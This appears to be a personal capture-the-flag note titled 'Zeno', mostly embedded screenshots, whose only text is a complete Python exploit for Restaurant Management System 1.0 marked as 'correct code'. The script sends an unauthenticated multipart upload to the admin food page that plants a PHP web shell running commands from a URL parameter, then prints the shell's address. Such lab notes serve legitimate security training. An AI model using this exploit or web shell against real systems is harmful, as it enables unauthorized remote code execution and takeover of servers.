# Zeno
27 March 2022
09:00 AM

<img src="Zeno/media/image1.png"
style="width:4.78333in;height:1.80833in" />

<img src="Zeno/media/image2.png"
style="width:4.675in;height:1.53333in" />

<img src="Zeno/media/image3.png"
style="width:5.95833in;height:1.08333in" />

<p>correct code::

\# Exploit Title: Restaurant Management System 1.0  - Remote Code Execution
\# Date: 2019-10-16
\# Exploit Author: Ibad Shah
\# Vendor Homepage: https://www.sourcecodester.com/users/lewa
\# Software Link: https://www.sourcecodester.com/php/11815/restaurant-management-system.html
\# Version: N/A
\# Tested on: Apache 2.4.41

#!/usr/bin/python

import requests
import sys

print ("""
    _  _   _____  __  __  _____   ______            _       _ _
  _| || |_|  __ \|  \/  |/ ____| |  ____|          | |     (_) |
 |_  __  _| |__) | \  / | (___   | |__  __  ___ __ | | ___  _| |_
  _| || |_|  _  /| |\/| |\___ \  |  __| \ \/ / '_ \| |/ _ \| | __|
 |_  __  _| | \ \| |  | |____) | | |____ >  <| |_) | | (_) | | |_
   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                             | |
                                             |_|


""")
print ("Credits : All InfoSec (Raja Ji's) Group")
url = sys.argv[1]

if len(sys.argv[1]) < 8:
	print("[+] Usage : python rms-rce.py http://localhost:80/")
	exit()

print ("[+] Restaurant Management System Exploit, Uploading Shell")

target = url+"admin/foods-exec.php"



headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478" ,
    "Connection": "close",
	"Referer": "http://localhost:8081/rms/admin/foods.php",
	"Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
	"Upgrade-Insecure-Requests": "1"

}

data = """

-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="reverse-shell.php"
Content-Type: text/html

<?php echo shell_exec($_GET["cmd"]); ?>
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--
"""
r = requests.post(target,verify=False, headers=headers,data=data)


print("[+] Shell Uploaded. Please check the URL : "+url+"images/reverse-shell.php")

</p>

<img src="Zeno/media/image4.png"
style="width:6.63333in;height:3.175in" />

<img src="Zeno/media/image5.png" style="width:6.55in;height:2.6in" />

<img src="Zeno/media/image6.png" style="width:6.375in;height:0.3in" />

<img src="Zeno/media/image7.png" style="width:6.46667in;height:1.5in" />

<img src="Zeno/media/image8.png" style="width:6.375in;height:3.75in" />

<img src="Zeno/media/image9.png"
style="width:6.30833in;height:3.29167in" />

<img src="Zeno/media/image10.png"
style="width:6.16667in;height:5.44167in" />

<img src="Zeno/media/image11.png"
style="width:6.075in;height:2.08333in" />

<img src="Zeno/media/image12.png"
style="width:6.375in;height:2.18333in" />

<img src="Zeno/media/image13.png"
style="width:6.425in;height:0.53333in" />

<img src="Zeno/media/image14.png"
style="width:4.19167in;height:1.13333in" />

<img src="Zeno/media/image15.png"
style="width:5.625in;height:1.15833in" />

<img src="Zeno/media/image16.png"
style="width:5.25in;height:4.08333in" />

<img src="Zeno/media/image17.png"
style="width:4.625in;height:3.54167in" />

<img src="Zeno/media/image18.png"
style="width:5.93333in;height:1.09167in" />

<img src="Zeno/media/image19.png"
style="width:5.93333in;height:1.9in" />
